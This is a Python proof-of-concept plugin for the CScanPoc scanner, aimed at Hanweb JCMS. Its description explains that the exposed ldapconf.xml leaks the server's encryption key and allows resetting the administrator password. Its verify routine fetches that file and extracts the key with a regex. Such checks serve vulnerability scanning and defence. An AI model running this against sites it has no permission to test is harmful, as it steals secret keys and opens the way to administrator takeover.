# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0004'  # 平台漏洞编号，留空
    name = '大汉科技JCMS 重置管理员密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-09-26'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb）/interface/ldap/receive.jsp这个组件，是一个不同大汉系统间，同步用户的通用组件。
        例如：jact系统，需要把jcms用户同步到自己的系统中，这个组件本来就是，用于创建用户的，如果被创建的用户存在的话，就会进行更新操作。

        保存密钥的ldapconf.xml文件，放在了网站目录，直接可以访问获得秘钥。
        我们可以使用大汉的加解密库进行任意加解密，只要知道服务端的密钥，就可以和服务器进行通讯
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0143528'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '71579d2f-9b3b-4260-8912-f556a99fbf61'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0143528
            hh = hackhttp.hackhttp()
            arg = self.target
            getdata = '/jcms/interface/ldap/ldapconf.xml'
            code, head, res, errcode, _ = hh.http(arg + getdata)
            m = re.search('<enckey>(.*?)</enckey>', res)
            if code == 200 and m:
                #security_hole(arg + getdata1 + "   :ldap leakage")
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
